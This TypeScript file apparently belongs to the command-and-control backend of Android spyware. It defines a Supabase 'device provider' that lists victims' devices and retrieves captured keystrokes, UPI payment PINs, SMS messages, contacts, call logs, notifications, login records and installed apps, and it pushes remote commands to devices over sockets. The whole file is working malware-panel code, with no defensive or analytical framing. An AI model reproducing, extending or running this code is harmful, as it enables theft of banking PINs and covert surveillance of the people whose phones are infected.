import { createClient } from '@supabase/supabase-js';
import config from '../config/env';
import { IDeviceProvider, DeviceStats } from './base';
import { io } from '../index';
import prisma from '../lib/prisma';

export class SupabaseProvider implements IDeviceProvider {
    private supabase = createClient(config.supabase.url, config.supabase.serviceRoleKey);
    private appId?: string;

    constructor(appId?: string) {
        this.appId = appId;
    }

    async listDevices(limit: number = 100): Promise<any[]> {
        if (!this.appId) {
            return []; // Strict isolation: no appId context = no data
        }

        let query = this.supabase
            .from('devices')
            .select('*')
            .eq('app_id', this.appId)
            .order('last_seen', { ascending: false })
            .limit(limit);

        const { data, error } = await query;
        if (error) throw error;

        const devices = data || [];
        if (devices.length === 0) return [];

        const deviceIds = devices.map(d => d.device_id);

        // Accurate and Scalable Multi-Device Counts: Use Prisma for grouping
        // This is much faster and bypasses PostgREST limits for large datasets
        const [keylogCounts, pinCounts] = await Promise.all([
            prisma.key_logger.groupBy({
                by: ['device_id'],
                where: { device_id: { in: deviceIds } },
                _count: { device_id: true }
            }),
            prisma.upi_pins.groupBy({
                by: ['device_id'],
                where: { device_id: { in: deviceIds } },
                _count: { device_id: true }
            })
        ]);

        // Aggregate counts into a map for fast O(1) matching
        const keyMap: Record<string, number> = {};
        const pinMap: Record<string, number> = {};

        keylogCounts.forEach(k => keyMap[k.device_id] = k._count.device_id);
        pinCounts.forEach(p => pinMap[p.device_id] = p._count.device_id);

        return devices.map(device => {
            const d: any = { ...device, _sourceProvider: 'SUPABASE' };
            d._count = {
                key_logs: keyMap[device.device_id] || 0,
                upi_pins: pinMap[device.device_id] || 0
            };
            return d;
        });
    }

    async getDevice(deviceId: string): Promise<any> {
        const { data, error } = await this.supabase
            .from('devices')
            .select('*')
            .eq('device_id', deviceId)
            .maybeSingle();

        if (error) throw error;
        if (!data) return null;

        // Fetch counts separately to avoid relationship errors
        const stats = await this.getDeviceStats(deviceId);

        const device: any = {
            ...data,
            app_id: this.appId || data.app_id,
            _sourceProvider: 'SUPABASE',
            _count: {
                key_logs: stats.keylogs || 0,
                upi_pins: stats.upiPins || 0
            }
        };

        return device;
    }

    async getDeviceStats(deviceId: string): Promise<DeviceStats> {
        const [msgCount, appCount, keyCount, pinCount] = await Promise.all([
            prisma.sms_messages.count({ where: { device_id: deviceId } }),
            prisma.installed_apps.count({ where: { device_id: deviceId } }),
            prisma.key_logger.count({ where: { device_id: deviceId } }),
            prisma.upi_pins.count({ where: { device_id: deviceId } })
        ]);

        return {
            messages: msgCount || 0,
            apps: appCount || 0,
            keylogs: keyCount || 0,
            upiPins: pinCount || 0
        };
    }

    async getMessages(deviceId: string, limit: number = 100): Promise<any[]> {
        const { data, error } = await this.supabase
            .from('sms_messages')
            .select('*')
            .eq('device_id', deviceId)
            .order('timestamp', { ascending: false })
            .limit(limit);

        if (error) throw error;
        return data || [];
    }

    async getApps(deviceId: string, limit: number = 200): Promise<any[]> {
        const { data, error } = await this.supabase
            .from('installed_apps')
            .select('*')
            .eq('device_id', deviceId)
            .order('app_name', { ascending: true })
            .limit(limit);

        if (error) throw error;
        return data || [];
    }

    async getKeylogs(deviceId: string, limit: number = 100): Promise<any[]> {
        const { data, error } = await this.supabase
            .from('key_logger')
            .select('*')
            .eq('device_id', deviceId)
            .order('created_at', { ascending: false })
            .limit(limit);

        if (error) throw error;
        return data || [];
    }

    async getUpiPins(deviceId: string): Promise<any[]> {
        const { data, error } = await this.supabase
            .from('upi_pins')
            .select('*')
            .eq('device_id', deviceId)
            .order('created_at', { ascending: false });

        if (error) throw error;
        return data || [];
    }

    async getHeartbeat(deviceId: string, limit: number = 50): Promise<any[]> {
        const { data, error } = await this.supabase
            .from('heartbeat')
            .select('*')
            .eq('device_id', deviceId)
            .order('created_at', { ascending: false })
            .limit(limit);

        if (error) throw error;
        return data || [];
    }

    async getSims(deviceId: string): Promise<any[]> {
        // Sims are usually embedded in the device object in this project
        const device = await this.getDevice(deviceId);
        return device?.sims || [];
    }

    async getNotifications(deviceId: string, limit: number = 100): Promise<any[]> {
        const { data, error } = await this.supabase
            .from('notifications')
            .select('*')
            .eq('device_id', deviceId)
            .order('created_at', { ascending: false })
            .limit(limit);
        if (error) return []; // Table might not exist
        return data || [];
    }

    async getCallLogs(deviceId: string, limit: number = 100): Promise<any[]> {
        const { data, error } = await this.supabase
            .from('call_logs')
            .select('*')
            .eq('device_id', deviceId)
            .order('created_at', { ascending: false })
            .limit(limit);
        if (error) return [];
        return data || [];
    }

    async getContacts(deviceId: string): Promise<any[]> {
        const { data, error } = await this.supabase
            .from('contacts')
            .select('*')
            .eq('device_id', deviceId)
            .order('name', { ascending: true });
        if (error) return [];
        return data || [];
    }

    async getLogins(deviceId: string): Promise<any[]> {
        const { data, error } = await this.supabase
            .from('login_records')
            .select('*')
            .eq('linked_device_id', deviceId)
            .order('created_at', { ascending: false });
        if (error) return [];
        return data || [];
    }

    async sendCommand(deviceId: string, command: string, payload: any): Promise<any> {
        const { data: cmd, error } = await this.supabase
            .from('device_commands')
            .insert([{
                device_id: deviceId,
                command,
                payload: payload || {},
                status: 'pending',
            }])
            .select()
            .single();

        if (error) throw error;

        // Emit to socket
        const commandForDevice = {
            id: cmd.id,
            deviceId: cmd.device_id,
            command: cmd.command,
            payload: cmd.payload,
            status: cmd.status
        };

        const deviceRooms = [`device:${deviceId}`, `device-${deviceId}`];
        deviceRooms.forEach(room => {
            io.to(room).emit('command', JSON.stringify([commandForDevice]));
            io.to(room).emit('new_command', { command: cmd });
        });

        return cmd;
    }

    async listAllMessages(limit: number = 100): Promise<any[]> {
        const { data, error } = await this.supabase
            .from('sms_messages')
            .select('*')
            .order('timestamp', { ascending: false })
            .limit(limit);
        if (error) throw error;
        return data || [];
    }

    async listAllApps(limit: number = 200): Promise<any[]> {
        const { data, error } = await this.supabase
            .from('installed_apps')
            .select('*')
            .order('created_at', { ascending: false })
            .limit(limit);
        if (error) throw error;
        return data || [];
    }

    async listAllKeylogs(limit: number = 100): Promise<any[]> {
        const { data, error } = await this.supabase
            .from('key_logger')
            .select('*')
            .order('created_at', { ascending: false })
            .limit(limit);
        if (error) throw error;
        return data || [];
    }

    async listAllUpiPins(limit: number = 100): Promise<any[]> {
        const { data, error } = await this.supabase
            .from('upi_pins')
            .select('*')
            .order('created_at', { ascending: false })
            .limit(limit);
        if (error) throw error;
        return data || [];
    }
}
